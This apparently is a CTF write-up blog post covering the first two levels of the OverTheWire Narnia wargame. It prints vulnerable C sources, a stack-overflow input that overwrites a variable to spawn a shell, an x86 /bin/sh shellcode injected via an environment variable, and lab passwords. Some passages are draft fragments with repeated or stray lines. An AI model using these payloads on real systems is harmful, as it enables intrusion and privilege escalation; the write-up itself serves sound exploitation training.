---
layout: post
title: Wargame/CTF Write-up - OverTheWire Narnia
tags: [Linux, Exploit, CTF, Wargame]
---

# Introduction to Narnia

[Narnia]() is one of OverTheWire's intermediate wargames.  There are a total of 10 levels which run on Linux/x86.  What follows below is the original description of Narnia (from intruded.net):

Description:

> This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it. The difficulty of the game is somewhere between Leviathan and Behemoth, but some of the levels could be quite tricky.

Here's some additional information that is given pertaining to each game:

* Narnia's levels are called narnia0, narnia1, ..., etc.
* Passwords (flags) are in `/etc/narnia_pass/narniaX`.
* Levels are stored in /narnia/.  Each level contains a source code file and a corresponding executable.
* OTW provides the following SSH Information:

   ```
   Host: narnia.labs.overthewire.org
   Port: 2226
   ```

Narnia can be accessed with the below SSH command.  Use the following SSH command to login to each game.

```bash
clarissa@ubuntu:~$ ssh narnia0@narnia.labs.overthewire.org -p 2226
```

## Level 0

The credentials to login to the first level are given:

narnia0 (username) / narnia0 (password)

First, `cd` to /narnia/ where all the data is located.  View the source code for this level with `cat narnia0.c`.

```bash
narnia0@narnia:~$ cd /narnia/
narnia0@narnia:/narnia$ ls
narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c
```

This level is pretty simple and can be solved simply by looking at the source code.  Pay attention to the order in which the variables `val` and `buf` are declared.

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
    }
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```

After the two local variables are pushed onto `main`'s stack frame, the stack memory is arranged like so:

![narnia0]({{ site.baseurl }}/assets/img/narnia.png)


The arrow in the above diagram indicates the direction of the stack overwrite.  Because `buf` is placed higher up on the stack, we can write past `buf` and change the contents of `val`'s memory.  Twenty characters to fill `buf` plus another 4 for `0xdeadbeef` (in reversed order because of little-endian notation) will overwrite `val` with the correct value.

Due to the little-endian architecture, we must write those bytes into memory in reverse order.

The first character is the least significant byte, due to the little-endian architecture.  This means to control the value variable with something exact, you must write those bytes into memory in reverse order.

Python can execute instructions on the command-line using the -c switch.  print command is useful for generating sequences of characters.  This command executes the commands found between the single quotes.

Using Python with the `-c` switch will execute instructions on the command-line / process/generate one line of code.  I'll use this technique with `print()` to output a sequence of characters / the payload as a string of bytes.

`python -c 'print "A"*20 + "\xef\xbe\xad\xde"'`

Then, I'll pass the output from the Python command into the executable's input via pipe redirection.  The full command and response is shown below.

```bash
narnia0@narnia:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
```

Great, we successfully changed the contents of `val` from `0x41414141` to `0xdeadbeef`, but no shell?!  What happened here is that the shell closed before we were able to use it.  So, we need a way to force the shell to stay open.  This can be done using a trick that appends `cat` to the input to keep the shell open.

The trick is to append the cat command to the input
cat /etc/narnia_pass/narnia1
efeidiedae

The revised solution and shell is given below.

```bash
narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
**********
```

The shell elevates our privileges one level up.  Since we're logged in as narnia0, we'll be able to access files as narnia1.  Once in the shell, I'll usually confirm this escalation with `whoami` or `id` then read the flag with `cat /etc/narnia_pass/narnia1`.
The shell prompt runs with elevated privileges. gain a root shell.

## Level 1

SSH into narnia1 with the username `narnia1` and the password we found in the previous level.
ENV VAR, SHELLCODE INJ

Let's start by reading the source code file for `narnia1.c`.

```c
#include <stdio.h>

int main(){
	int (*ret)();

	if(getenv("EGG")==NULL){
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}
```

The program is attempting to execute code at `getenv("EGG")`.  The function `getenv()` searches the environment of the calling process for the environment variable called "EGG" and returns a pointer to the value of the environment variable.  Otherwise, a null pointer is returned.

A buffer is not the only location that can hold shellcode.  There are other locations in memory where shellcode can be stashed.

Programs use environment variables

Environment variables are used by the user shell for a variety of things, but what they are used for isn’t as important as the fact they are located on the stack and can be set from the shell.
The example below sets an environment variable called MYVAR to the string test.
This environment variable can be accessed by prepending a dollar sign to its name. In addition, the env command will show all the  environment variables.

```
export MYVAR=test
echo $MYVAR
env
```

Similarly, the shellcode can be put in an environment variable, but first it needs to be in a form we can easily manipulate. The shellcode from the notesearch exploit can be used; we just need to put it into a file in binary form.
Shellcode in a file shellcode.bin. ** find in booksrc folder.

Using the below the command I was able to create the environment varible called “EGG” which will contain the shellcode. The shellcode is used to gain a shell, it is a “/bin/sh” payload.

So here we need to set an environment variable named EGG to something we want executed. We can't just pass /bin/bash as it's going to call whatever we give it as a function. Ideally we want a shell, so what we need in this case is the shellcode to do just that.
shellcode
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

Now we have the shellcode in a file.  This can be used with command substitution to put shellcode into an environment variable.
export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat shellcode.bin)

An entire shell command can be executed like a function, returning its output in place.  The output of the command between the parentheses is substituted for the command.

The shellcode is now on the stack in an environment variable.  The env variables are located near the bottom of the stack.

```bash
narnia1@melinda:~$ cd /narnia
narnia1@melinda:/narnia$ export EGG=$(python -c'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
$
```
